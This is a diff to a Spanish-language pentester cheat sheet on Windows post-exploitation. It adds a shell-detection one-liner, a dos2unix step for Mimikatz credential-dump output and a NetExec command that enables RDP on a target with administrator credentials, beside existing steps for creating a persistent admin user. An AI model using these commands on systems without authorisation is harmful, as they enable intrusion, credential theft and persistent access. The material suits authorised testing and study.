@@ -1,3 +1,7 @@
+- Saber si estamos ante cmd ó powershell: 
+	```powershell
+	(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+	```
 - Comprobar arquitectura de Windows
 	- Sin privilegios: 
 		```powershell
@@ -10,7 +14,10 @@
 - Convertir en archivo de texto, supongamos `infoMimikatz`, con formato grepeable correcto (a veces la extracción de mimikatz da problemas)
 	```bash
 	dos2unix infoMimikatz
+	# si no funciona
+	dos2unix -f infoMimikatz
 	```
+
 
 ## Con acceso de administrador a un sistema Windows
 ### Crear un usuario persistente con permisos de administrador
@@ -23,6 +30,10 @@
     net localgroup Administrators pentester /add
     ```
 ### Habilitar RDP (Escritorio Remoto)
+- Habilitar RDP con `nxc`
+	```bash
+	nxc smb $IP -u administrator -p pass123 -M rdp -o ACTION=enable==
+	```
 - **Habilitar conexiones RDP:**
     ```powershell
     # Desde CMD
